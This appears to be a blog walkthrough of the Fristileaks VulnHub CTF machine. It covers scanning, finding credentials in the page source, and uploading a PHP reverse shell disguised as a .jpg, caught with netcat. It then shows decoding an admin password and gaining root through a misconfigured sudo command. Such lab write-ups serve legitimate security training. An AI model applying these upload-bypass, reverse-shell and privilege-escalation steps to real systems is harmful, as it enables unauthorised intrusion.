<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Fristileaks VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-fristileaks-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-10-02T14:11:12+00:00">October 2, 2016</time><time class="updated" datetime="2025-06-10T20:30:33+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we will walk through the first leaks VM. There is nothing that we know about this VM except for the fact that the security level is from beginner to intermediate. Also, this VM only works on <strong>08:00:27:A5:A6:76 </strong>MAC address or else it will not work.</span></p>
<p><span style="color: #000000;"><em>You can download it from here: </em><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.vulnhub.com/entry/fristileaks-13,133/"><em>https://www.vulnhub.com/entry/fristileaks-13,133/</em></a></span></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Get root Access and Capture the Flag</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;">Scanning Network</span></li>
<li><span style="color: #000000;">Enumeration</span></li>
<li><span style="color: #000000;">Exploiting Web Application</span></li>
<li><span style="color: #000000;">Post Exploit Enumeration</span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Capture the Flag</span></li>
</ul>
<p><span style="color: #000000;"><b>Walkthrough</b></span></p>
<h3><span style="color: #800000;"><strong>Scanning Network </strong></span></h3>
<p><span style="color: #000000;">Let’s start by scanning your victims’ IP.</span></p>
<pre class="lang:default decode:true">nmap -A 19.168.1.110</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wCbN6hWn5ww/XFG30NocBxI/AAAAAAAAcdc/dW50wuc4yDMKRdLGgDBg-NjD6evlbzPtACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Nmap shows us that port number 80 is open. Therefore, let’s open our victim’s IP in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gp_XEf9LyYQ/XFG32JivyJI/AAAAAAAAcd8/BFrZcdyPESUPeikAaa9CXpctwdonFmWpQCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Exploring the webpage, it occurred to me that fristi is also a drink like a cola or beer or sisi and also there was the reference to it on the home page so there is a possibility that fristi is also a directory here. And there was no harm in trying it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LPRhE6QLSRo/XFG32Y5sE_I/AAAAAAAAceA/6TYl08rDNacOHf-FLBEK_ZKoAut8D2yLACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">And we found the login portal through fristi. Cheers. Once I looked at the source page of this directory, I found what I think is a username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-76-xg979QZM/XFG32oBqd6I/AAAAAAAAceE/AJGUjsyddeEiYu26ko9T2HocGOEXPEYawCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Also, by reading the metadata of the image which was encoded as indicated in the page source I found a string of letters. To decode type:</span></p>
<pre class="lang:default decode:true">base64 -d encode &gt; 1.png</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w6O0_851uDU/XFG33FiAMsI/AAAAAAAAceI/XGzKFpTunWktatgM-TIkqAtciXBeAsdIQCLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Web Application</span></h3>
<p><span style="color: #000000;">Then, we made up a php_reverse shell (available inside: /usr/share/webshells/php), in the form of <strong>.jpg</strong> and modified lhost and lport values.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tGtyLlynV-Y/XFG33SysqcI/AAAAAAAAceM/iQDkFzpvCp4Ty_h_c7o4nx-FNTJfNUBCgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">And then uploaded this shell in <strong>192.168.1.110/fristi/do_upload.php.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_uwKokYS1H0/XFG33kDZlnI/AAAAAAAAceQ/2bASuvv17Mkgg7iOAuMnb3d1D_C9XvDqQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">And then we executed our shell by typing:</span></p>
<pre class="lang:default decode:true">192.168.1.110/fristi/uploads/shell/php.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0c3bCb96QVg/XFG30I3s_-I/AAAAAAAAcdk/pk4J0C85UDorr5DFIEQqV-UV6fXfuPV9gCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Then through netcat we will listen in and get a session while navigating around:</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
cd /home
ls
cd eezpeez
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7omI70xWJ88/XFG30KYJ45I/AAAAAAAAcdg/m8vTOjWyI5AVAStl81zqh_n6zIIm_rdKQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Post Exploit Enumeration</span></p>
<p><span style="color: #000000;">So, in /eezpeez directory we found a notes.txt file. Let’s read it:</span></p>
<pre class="lang:default decode:true">cat notes.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-J8nnSPF8oCs/XFG30u9iLMI/AAAAAAAAcdo/caC-CwsRk5o7VqdLcNXN69R-9-24mwMiwCLcBGAs/s1600/12.png"/></strong></span></p>
<p><span style="color: #000000;">Again in the notes.txt, there is a message from Jerry telling us what to do. So let’s follow his steps by typing:</span></p>
<pre class="lang:default decode:true">echo "/home/admin/chmod –R 777 /home/admin" &gt; /tmp/runthis</pre>
<p><span style="color: #000000;">After typing the command go back to the home folder and from there go into the admin directory.</span></p>
<pre class="lang:default decode:true">cd /tmp
cd /home/admin
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dqx5nyjPTIQ/XFG31mKdeeI/AAAAAAAAcdw/0BSgqMp0BQow445wfjLQxvtwhFdZV3rcQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now, in the above image, you can see that it said that the code allows the string to be encrypted so now, save the script in your kali and then change the word ‘base64string’ to ‘decoded’ in the script and finally use the following command to decrypt it :</span></p>
<pre class="lang:default decode:true ">python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG</pre>
<p><span style="color: #000000;">And the decoded string is ‘LetThereBeFristi!’</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gKG4yFIJGkk/XFG30weGSQI/AAAAAAAAcds/eHlABqqeiYcJMpZcmrFS8HMXs6uFHo-cgCLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Now, this may be the password to fristigod user. So let’s try and use it. For this we need to switch user so, type the following command:</span></p>
<pre class="lang:default decode:true">su fristigod</pre>
<p><span style="color: #000000;">Enter ‘LetThereBeFristi’ as a password. Then I explored the fristigod folder and there I found the history file. In this history file, there was one command that was used over and over again with sudo permissions:</span></p>
<pre class="lang:default decode:true">cd /var/fristigod
ls -lsa
cat bash.history</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4Lk5AT3KP-o/XFG31yWr3bI/AAAAAAAAcd4/o85u3Tw1JjAlmx-jQ9okUC-4qQdxTTzeACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">So let’s check sudo right for the said command to work. Therefore type:</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">It will ask for a password for fristigod, use the same password as above. Then to give rights type:</span></p>
<pre class="lang:default decode:true">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
id
cd /root
ls
cat fristileafs_secrets.txt</pre>
<p><span style="color: #000000;">Then by navigating around using the above commands, I found a text file. By reading the contents of the file you can see that you have found second/last flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LNqlW0ikVcw/XFG31vDS7SI/AAAAAAAAcd0/rXAtjvkN8542eZGqu4-lDmxK25LLEHkoQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">And VOILA!! This way you solve another CTF called fristileaks. Happy Pentesting!!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
